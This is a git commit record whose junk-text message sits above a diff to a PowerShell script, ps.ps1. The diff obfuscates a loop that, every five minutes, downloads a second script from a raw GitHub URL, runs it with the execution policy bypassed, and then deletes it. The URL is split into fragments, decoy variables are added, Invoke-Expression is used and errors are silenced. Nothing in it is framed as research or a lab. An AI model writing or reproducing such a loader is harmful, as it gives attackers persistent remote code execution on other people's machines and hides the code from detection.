bb9a88084ee9cc265873004bceff60f8cb30c64c
t0fum4n <driftka24de@gmail.com>
2024-09-15 00:06:49 -0500

    asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf

--- ps.ps1
+++ ps.ps1
@@ -1,12 +1,35 @@
-$repoUrl = 'https://raw.githubusercontent.com/t0fum4n/-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/main/ps2.ps1'
-$filePath = "$env:USERPROFILE\Documents\ps2.ps1"
+$junk1 = "jf9sd7fsd9f" + "s8df79sdf87sd"
+$junk2 = "udf8sd7f" + "sd89f7dsf8sd"
+$x1 = ('https://r','aw.g','ithubu','serco','nten','t.co','m/')[0,1,2,3,4,5,6] -join ''
+$y1 = ('t0f','u')[0]
+$y2 = ('v9','4837-0','9273w','54-068')[0..3] -join ''
+$y3 = ('b2-40','59y-b','n3-240')[0..2] -join ''
+$z1 = ('50-69','u-')[0,1] -join ''
+$z2 = ('50-8620','54986-2','034p2')[0..2] -join ''
+$x2 = $y1 + $y2 + $y3 + $z1 + $z2 + ('345iuyu6','po7iu2','9345w')[0..2] -join ''
+$x3 = ('main','/ps2','.ps1')[0,1,2] -join ''
+$trash1 = "asdd09asdd" + "098adsd"
+$trash2 = "wer098w" + "098wer98"
+$url1 = $x1
+$url2 = $x2
+$url3 = $x3
+$urlFinal = $url1 + $url2 + $url3
+$path1 = "$env:USERPROFILE"
+$path2 = "\Documents\ps2.ps1"
+$filePath = $path1 + $path2
+$dummy = Get-Process | Where-Object { $_.Name -eq "dummyprocess" }
 while ($true) {
     try {
-        Invoke-WebRequest -Uri $repoUrl -OutFile $filePath
-        powershell -ExecutionPolicy Bypass -File $filePath
-        Remove-Item -Path $filePath -Force
+        $junk = "randomstring" + "junkdata"
+        $cmd = "Invoke-WebRequest -Uri " + $urlFinal + " -OutFile " + $filePath
+        Invoke-Expression $cmd
+        $execCmd = "powershell -ExecutionPolicy Bypass -File " + $filePath
+        Invoke-Expression $execCmd
+        $removeCmd = "Remove-Item -Path " + $filePath + " -Force"
+        Invoke-Expression $removeCmd
     } catch {
-        Write-Host "Error: $_"
+        $errorVar = "err" + "junk"
     }
+    $sleepVar = "sleep" + "junk"
     Start-Sleep -Seconds 300
 }
